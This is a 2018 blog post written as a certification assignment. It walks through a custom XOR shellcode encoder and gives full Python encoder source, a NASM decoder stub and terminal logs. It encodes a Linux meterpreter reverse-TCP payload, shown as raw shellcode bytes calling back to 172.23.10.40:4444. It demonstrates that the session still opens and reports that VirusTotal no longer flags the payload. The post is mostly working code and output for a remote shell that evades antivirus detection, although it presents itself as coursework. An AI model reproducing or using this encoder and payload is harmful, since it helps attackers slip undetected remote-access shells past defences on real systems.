---
layout: single
title: Custom shellcode encoder
date: 2018-11-22
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - slae
  - infosec
tags:
  - slae
  - assembly
  - encoding
---

A shellcode encoder can be used for different purposes such as modify an existing shellcode to make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).

The encoder itself doesn't provide any real security however since the obfuscation scheme is built into the code and is therefore reversible by anyone who has access to the encoded shellcode. This should not be confused with encryption, where security is based on the key and not the secrecy of the encryption scheme.

In this post, we go over a simple encoder that performs the following:
1. The encoder pads the shellcode with NOP opcodes so it is 4 bytes aligned
2. A random byte is generated for each 4 bytes of the shellcode
3. The 4 bytes are put in the reverse order and XORed with the XOR byte
4. Process is repeated until the `0x9090aaaa` marker is reached

The following diagram explains the process:

![](/assets/images/custom-encoder/encoder.png)

To encode the shellcode, a Python script is used and reads the shellcode from the input file in `\xFF\xEE\xDD...` format. As explained earlier, a XOR byte is randomly chosen for each 4 bytes tuple. If any of the encoded bytes end up being XORed to \x00, another random XOR byte is chosen instead to avoid nulls being insert in the final shellcode.

A marker is added at the end of the shellcode so the length of the encoded shellcode doesn't need to be included in the decoder stub.

The code of the encoder is shown here:
--------------------------------------

```python
#!/usr/bin/python

import random
import socket
import struct
import sys

# Decoder stub
decoder_stub = "\xeb\x57\x31\xc0\x31\xdb\x31\xc9"
decoder_stub += "\x31\xd2\x5e\xbf\x90\x90\xaa\xaa"
decoder_stub += "\x83\xec\x7f\x83\xec\x7f\x83\xec"
decoder_stub += "\x7f\x83\xec\x7f\x8a\x5c\x16\x01"
decoder_stub += "\x8a\x7c\x16\x02\x8a\x4c\x16\x03"
decoder_stub += "\x8a\x6c\x16\x04\x32\x1c\x16\x32"
decoder_stub += "\x3c\x16\x32\x0c\x16\x32\x2c\x16"
decoder_stub += "\x88\x2c\x04\x88\x4c\x04\x01\x88"
decoder_stub += "\x7c\x04\x02\x88\x5c\x04\x03\x39"
decoder_stub += "\x7c\x16\x05\x74\x0a\x42\x42\x42"
decoder_stub += "\x42\x42\x83\xc0\x04\x75\xc5\xff"
decoder_stub += "\xe4\xe8\xa4\xff\xff\xff"

# Seed PRNG (don't use this for real crypto)
random.seed()

if len(sys.argv) < 2:
        print('Usage: {name} [shellcode_file]'.format(name = sys.argv[0]))
        exit(1)

shellcode_file = sys.argv[1]

# Read shellcode from file in '\xFF\xEE\xDD' format
with open(shellcode_file) as f:
        shellcode_original = bytearray.fromhex(f.read().strip().replace('\\x',''))

# If shellcode is not 4 bytes aligned, adding padding bytes at the end
if len(shellcode_original) % 4 != 0:
        padding = 4 - (len(shellcode_original) % 4)
else:
        padding = 0
if padding:
        print('[+] Shellcode not 4 bytes aligned, adding {} \\x90 bytes of padding...'.format(padding))
        for i in range(0, padding):
                shellcode_original.append(0x90)

shellcode_encoded = bytearray()

# Process 4 bytes at a time
for i in range(0, len(shellcode_original), 4):
        xor_byte_good = False
        while(xor_byte_good == False):
                # Generate random XOR byte
                r = random.randint(1,255)
                # Check that resulting shellcode doesn't contain null bytes
                if (r ^ shellcode_original[i] != 0) and (r ^ shellcode_original[i+1] != 0) and (r ^ shellcode_original[i+2] != 0) and (r ^ shellcode_original[i+3] != 0):
                        xor_byte_good = True

        # Encoded shellcode contains XOR byte + next 4 bytes reversed
        shellcode_encoded.append(r)
        shellcode_encoded.append(shellcode_original[i+3] ^ r)
        shellcode_encoded.append(shellcode_original[i+2] ^ r)
        shellcode_encoded.append(shellcode_original[i+1] ^ r)
        shellcode_encoded.append(shellcode_original[i] ^ r)

# Add end of shellcode marker
shellcode_encoded.append(0x90)
shellcode_encoded.append(0x90)
shellcode_encoded.append(0xaa)
shellcode_encoded.append(0xaa)

# Print out the output
decoder_stub_hex = ''.join('\\x{}'.format(hex(ord(x))[2:]) for x in decoder_stub)
shellcode_original_hex = ''.join('\\x{:02x}'.format(x) for x in shellcode_original)
shellcode_encoded_hex = ''.join('\\x{:02x}'.format(x) for x in shellcode_encoded)
shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shellcode_encoded).rstrip(',')
print('[+] Original shellcode (len: {}): {}\n'.format(len(shellcode_original), shellcode_original_hex))
print('[+] Encoded shellcode (len: {}): {}\n'.format(len(shellcode_encoded), shellcode_encoded_hex))
print('[+] Encoded shell in NASM format: {}\n'.format(shellcode_encoded_nasm))
print('[+] Encoded shellcode /w decoder stub (len: {}): {}\n'.format(len(decoder_stub) + len(shellcode_encoded), decoder_stub_hex + shellcode_encoded_hex))
```

The decoder uses the *JMP CALL POP* technique to push the address of the encoded shellcode on the stack. The decoder stub then makes room for 512 bytes on the stack by decreasing `$esp` by 512.

We use the `$edx` to keep track of the offset from the start of the encoded shellcode.

For each 4 bytes tuple, the bytes are stored as follows:
- 1st byte: `$bl`
- 2nd byte: `$bh`
- 3rd byte: `$cl`
- 4th byte: `$ch`

Then we XOR each byte with the key, located at `[$esi + $edx]` and store the results on the stack in reverse order. After each tuple is decoded, the decoder stub checks if the marker is reached and jumps to the shellcode on the stack if that's the case.

The complete decoder stub code if shown here:
---------------------------------------------

```nasm
global _start

section .text

_start:
        jmp short call_shellcode

decoder:
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
        pop esi             ; address of shellcode
        mov edi, 0xaaaa9090 ; end of shellcode marker
        sub esp, 0x7f       ; make room on the stack (512 bytes)
        sub esp, 0x7f       ; make room on the stack
        sub esp, 0x7f       ; make room on the stack
        sub esp, 0x7f       ; make room on the stack

decode:
        mov bl, byte [esi + edx + 1]    ; read 1st encoded byte
        mov bh, byte [esi + edx + 2]    ; read 2nd encoded byte
        mov cl, byte [esi + edx + 3]    ; read 3rd encoded byte
        mov ch, byte [esi + edx + 4]    ; read 4th encoded byte
        xor bl, byte [esi + edx]        ; xor with the key byte
        xor bh, byte [esi + edx]        ; xor with the key byte
        xor cl, byte [esi + edx]        ; xor with the key byte
        xor ch, byte [esi + edx]        ; xor with the key byte
        mov byte [esp + eax], ch        ; store in memory in reverse order to restore original shellcode
    	mov byte [esp + eax + 1], cl    ; ..
        mov byte [esp + eax + 2], bh    ; ..
        mov byte [esp + eax + 3], bl    ; ..

        cmp dword [esi + edx + 5], edi  ; check if we have reached the end of shellcode marker
        jz execute_shellcode            ; if we do, jump to the shellcode and execute it

        inc edx
        inc edx
        inc edx
        inc edx
        inc edx
        add eax, 4
        jnz decode

execute_shellcode:
        jmp short esp

call_shellcode:
        call decoder
        encoder_shellcode: db 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
```

Testing non-encoded shellcode against Virus Total
-------------------------------------------------

To test the encoder and see what effects it has on AV engine detection, I used a meterpreter reverse TCP payload and compiled it using the test C program without any encoding first. 

```
root@ragingbeaver:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -f c LHOST=172.23.10.40 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes
unsigned char buf[] = 
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\xac\x17\x0a\x28\x68\x02\x00\x11\x5c"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";
```

Testing the shellcode with the test program:

```
slemire@slae:~/slae32/assignment4$ gcc -z execstack -o msf msf.c
slemire@slae:~/slae32/assignment4$ file msf
msf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b36888fc1e3651d37ea86204f44e8d4078f99bd7, not stripped
```

```
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.23.10.40:4444 
[*] Sending stage (861480 bytes) to 172.23.10.37
[*] Meterpreter session 1 opened (172.23.10.40:4444 -> 127.0.0.1) at 2018-11-22 08:08:36 -0500
```

When submitted on VirusTotal, the meterpreter payload was picked up by a few AV engines:

![](/assets/images/custom-encoder/msfpayload_plain.png)

Encoded version
---------------

Next, the same payload was encoded with the custom encoder:

```
slemire@slae:~/slae32/assignment4$ ./encoder.py msf_met_reversetcp.txt 
[+] Shellcode not 4 bytes aligned, adding 1 \x90 bytes of padding...
[+] Original shellcode (len: 124): \x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xac\x17\x0a\x28\x68\x02\x00\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\x90
[+] Encoded shellcode (len: 159): \x44\x75\x1a\x4e\x2e\x96\xc5\x75\x61\x4d\xcc\xce\xa6\x9f\x8f\xb4\x55\x3d\xd2\x04\x28\x73\xbf\xa8\xe5\xca\xc0\xdd\x66\xa2\xb1\xb1\xb3\xd9\x99\xf0\x11\x79\xac\xe1\x23\x73\x7b\x45\x49\x40\xa1\xc9\x17\x11\xdf\x5a\x5f\x12\x9c\x4b\x05\x52\x32\x8b\xa9\x0b\xc1\x94\xdd\x0a\x52\x0a\x0a\x0a\xb7\xb2\xdd\xb7\xdd\x07\xce\x36\xe4\x8e\xf6\x36\x73\x76\x3b\x45\x62\xae\xf8\x3c\x24\x24\x9d\x23\x96\x9c\x15\x9c\x9c\x8c\xf7\xfb\x1c\x36\x14\x38\x88\x34\xdb\xf9\xcf\x4a\x4f\x02\xb2\x72\x29\x62\x0a\xb2\x88\x3e\x11\x69\x01\x3b\xf6\x38\x8b\x37\x8c\xf4\x4c\x09\x0c\x35\x8d\xd4\xca\x37\xa9\xa9\xa9\xa9\xa8\x65\x65\x65\x64\xde\x9b\x0b\x1b\x56\x9b\x90\x90\xaa\xaa
[+] Encoded shell in NASM format: 0x44,0x75,0x1a,0x4e,0x2e,0x96,0xc5,0x75,0x61,0x4d,0xcc,0xce,0xa6,0x9f,0x8f,0xb4,0x55,0x3d,0xd2,0x04,0x28,0x73,0xbf,0xa8,0xe5,0xca,0xc0,0xdd,0x66,0xa2,0xb1,0xb1,0xb3,0xd9,0x99,0xf0,0x11,0x79,0xac,0xe1,0x23,0x73,0x7b,0x45,0x49,0x40,0xa1,0xc9,0x17,0x11,0xdf,0x5a,0x5f,0x12,0x9c,0x4b,0x05,0x52,0x32,0x8b,0xa9,0x0b,0xc1,0x94,0xdd,0x0a,0x52,0x0a,0x0a,0x0a,0xb7,0xb2,0xdd,0xb7,0xdd,0x07,0xce,0x36,0xe4,0x8e,0xf6,0x36,0x73,0x76,0x3b,0x45,0x62,0xae,0xf8,0x3c,0x24,0x24,0x9d,0x23,0x96,0x9c,0x15,0x9c,0x9c,0x8c,0xf7,0xfb,0x1c,0x36,0x14,0x38,0x88,0x34,0xdb,0xf9,0xcf,0x4a,0x4f,0x02,0xb2,0x72,0x29,0x62,0x0a,0xb2,0x88,0x3e,0x11,0x69,0x01,0x3b,0xf6,0x38,0x8b,0x37,0x8c,0xf4,0x4c,0x09,0x0c,0x35,0x8d,0xd4,0xca,0x37,0xa9,0xa9,0xa9,0xa9,0xa8,0x65,0x65,0x65,0x64,0xde,0x9b,0x0b,0x1b,0x56,0x9b,0x90,0x90,0xaa,0xaa
```

The shellcode is added to the decoder stub assembly file, compiled and linked:

```
slemire@slae:~/slae32/assignment4$ ../compile.sh stub_decoder
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \xeb\x57\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x5e\xbf\x90\x90\xaa\xaa\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x8a\x5c\x16\x01\x8a\x7c\x16\x02\x8a\x4c\x16\x03\x8a\x6c\x16\x04\x32\x1c\x16\x32\x3c\x16\x32\x0c\x16\x32\x2c\x16\x88\x2c\x04\x88\x4c\x04\x01\x88\x7c\x04\x02\x88\x5c\x04\x03\x39\x7c\x16\x05\x74\x0a\x42\x42\x42\x42\x42\x83\xc0\x04\x75\xc5\xff\xe4\xe8\xa4\xff\xff\xff\x44\x75\x1a\x4e\x2e\x96\xc5\x75\x61\x4d\xcc\xce\xa6\x9f\x8f\xb4\x55\x3d\xd2\x04\x28\x73\xbf\xa8\xe5\xca\xc0\xdd\x66\xa2\xb1\xb1\xb3\xd9\x99\xf0\x11\x79\xac\xe1\x23\x73\x7b\x45\x49\x40\xa1\xc9\x17\x11\xdf\x5a\x5f\x12\x9c\x4b\x05\x52\x32\xa9\x0b\xc1\x94\xdd\x0a\x52\x0a\x0a\x0a\xb7\xb2\xdd\xb7\xdd\x07\xce\x36\xe4\x8e\xf6\x36\x73\x76\x3b\x45\x62\xae\xf8\x3c\x24\x24\x9d\x23\x96\x9c\x15\x9c\x9c\x8c\xf7\xfb\x1c\x36\x14\x38\x88\x34\xdb\xf9\xcf\x4a\x4f\x02\xb2\x72\x29\x62\x0a\xb2\x88\x3e\x11\x69\x01\x3b\xf6\x38\x8b\x37\x8c\xf4\x4c\x09\x0c\x35\x8d\xd4\xca\xa9\xa9\xa9\xa9\xa8\x65\x65\x65\x64\xde\x9b\x1b\x56\x9b\x90\x90\xaa\xaa
[+] Length: 250
[+] Done!
```

Veryfing that the shellcode still works...

```
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.23.10.40:4444 
[*] Sending stage (861480 bytes) to 172.23.10.37
[*] Meterpreter session 3 opened (127.0.0.1 -> 127.0.0.1) at 2018-11-22 08:16:09 -0500
```

The file is not picked up by Virus Total anymore:

![](/assets/images/custom-encoder/msfpayload_encoded.png)

Automating the creation of the shellcode
----------------------------------------

We don't need to manually add the encoded shellcode to the `.asm` file every time and re-compile from NASM. The python script has been modified to automatically prepend the decoder stub to the output shellcode so we can just use this in the test C program.

```
slemire@slae:~/slae32/assignment4$ ./encoder.py msf_met_reversetcp.txt 
[+] Shellcode not 4 bytes aligned, adding 1 \x90 bytes of padding...
[+] Original shellcode (len: 124): \x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xac\x17\x0a\x28\x68\x02\x00\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\x90

[+] Encoded shellcode (len: 159): \x45\x74\x1b\x4f\x2f\x45\x16\xa6\xb2\x9e\x93\x91\xf9\xc0\xd0\x22\xc3\xab\x44\x92\xcf\x94\x58\x4f\x02\x94\x9e\x83\x38\xfc\x7c\x7c\x7e\x14\x54\x3a\xdb\xb3\x66\x2b\xd5\x85\x8d\xb3\xbf\xb6\x57\x3f\xe1\xe7\x39\xbc\xb9\xf4\x7a\x2f\x61\x36\x56\xef\x4f\xed\x27\x72\x3b\x9c\xc4\x9c\x9c\x9c\x5c\x59\x36\x5c\x36\x70\xb9\x41\x93\xf9\x17\xd7\x92\x97\xda\x95\xb2\x7e\x28\xec\x77\x77\xce\x70\xc5\xd3\x5a\xd3\xd3\xc3\x14\x18\xff\xd5\xf7\x7e\xce\x72\x9d\xbf\xe4\x61\x64\x29\x99\x67\x3c\x77\x1f\xa7\xa0\x16\x39\x41\x29\xf7\x3a\xf4\x47\xfb\x5c\x24\x9c\xd9\xdc\x3d\x85\xdc\xc2\x3f\x51\x51\x51\x51\x50\x77\x77\x77\x76\xcc\x6f\xff\xef\xa2\x6f\x90\x90\xaa\xaa

[+] Encoded shell in NASM format: 0x45,0x74,0x1b,0x4f,0x2f,0x45,0x16,0xa6,0xb2,0x9e,0x93,0x91,0xf9,0xc0,0xd0,0x22,0xc3,0xab,0x44,0x92,0xcf,0x94,0x58,0x4f,0x02,0x94,0x9e,0x83,0x38,0xfc,0x7c,0x7c,0x7e,0x14,0x54,0x3a,0xdb,0xb3,0x66,0x2b,0xd5,0x85,0x8d,0xb3,0xbf,0xb6,0x57,0x3f,0xe1,0xe7,0x39,0xbc,0xb9,0xf4,0x7a,0x2f,0x61,0x36,0x56,0xef,0x4f,0xed,0x27,0x72,0x3b,0x9c,0xc4,0x9c,0x9c,0x9c,0x5c,0x59,0x36,0x5c,0x36,0x70,0xb9,0x41,0x93,0xf9,0x17,0xd7,0x92,0x97,0xda,0x95,0xb2,0x7e,0x28,0xec,0x77,0x77,0xce,0x70,0xc5,0xd3,0x5a,0xd3,0xd3,0xc3,0x14,0x18,0xff,0xd5,0xf7,0x7e,0xce,0x72,0x9d,0xbf,0xe4,0x61,0x64,0x29,0x99,0x67,0x3c,0x77,0x1f,0xa7,0xa0,0x16,0x39,0x41,0x29,0xf7,0x3a,0xf4,0x47,0xfb,0x5c,0x24,0x9c,0xd9,0xdc,0x3d,0x85,0xdc,0xc2,0x3f,0x51,0x51,0x51,0x51,0x50,0x77,0x77,0x77,0x76,0xcc,0x6f,0xff,0xef,0xa2,0x6f,0x90,0x90,0xaa,0xaa

[+] Encoded shellcode /w decoder stub (len: 253): \xeb\x57\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x5e\xbf\x90\x90\xaa\xaa\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x8a\x5c\x16\x1\x8a\x7c\x16\x2\x8a\x4c\x16\x3\x8a\x6c\x16\x4\x32\x1c\x16\x32\x3c\x16\x32\xc\x16\x32\x2c\x16\x88\x2c\x4\x88\x4c\x4\x1\x88\x7c\x4\x2\x88\x5c\x4\x3\x39\x7c\x16\x5\x74\xa\x42\x42\x42\x42\x42\x83\xc0\x4\x75\xc5\xff\xe4\xe8\xa4\xff\xff\xff\x45\x74\x1b\x4f\x2f\x45\x16\xa6\xb2\x9e\x93\x91\xf9\xc0\xd0\x22\xc3\xab\x44\x92\xcf\x94\x58\x4f\x02\x94\x9e\x83\x38\xfc\x7c\x7c\x7e\x14\x54\x3a\xdb\xb3\x66\x2b\xd5\x85\x8d\xb3\xbf\xb6\x57\x3f\xe1\xe7\x39\xbc\xb9\xf4\x7a\x2f\x61\x36\x56\xef\x4f\xed\x27\x72\x3b\x9c\xc4\x9c\x9c\x9c\x5c\x59\x36\x5c\x36\x70\xb9\x41\x93\xf9\x17\xd7\x92\x97\xda\x95\xb2\x7e\x28\xec\x77\x77\xce\x70\xc5\xd3\x5a\xd3\xd3\xc3\x14\x18\xff\xd5\xf7\x7e\xce\x72\x9d\xbf\xe4\x61\x64\x29\x99\x67\x3c\x77\x1f\xa7\xa0\x16\x39\x41\x29\xf7\x3a\xf4\x47\xfb\x5c\x24\x9c\xd9\xdc\x3d\x85\xdc\xc2\x3f\x51\x51\x51\x51\x50\x77\x77\x77\x76\xcc\x6f\xff\xef\xa2\x6f\x90\x90\xaa\xaa
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1236

All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)